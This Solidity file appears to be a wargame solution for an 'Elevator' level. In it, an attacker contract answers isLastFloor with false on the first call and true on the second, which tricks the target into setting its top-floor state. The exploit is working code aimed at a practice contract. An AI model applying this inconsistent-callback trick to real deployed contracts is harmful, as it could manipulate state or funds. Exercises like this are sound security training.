// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract Level11 is Building {
    Elevator elevator;
    uint256 private calls;

    constructor(address payable elevatorAddr) public {
        elevator = Elevator(elevatorAddr);
    }

    /**
     * Returns `false` first, then `true`.
     */
    function isLastFloor(uint256 _) external override returns (bool) {
        _; // Silence compiler warning
        ++calls;
        if (calls % 2 == 1) {
            return false;
        }
        return true;
    }

    function main() external payable {
        elevator.goTo(999);
    }
}
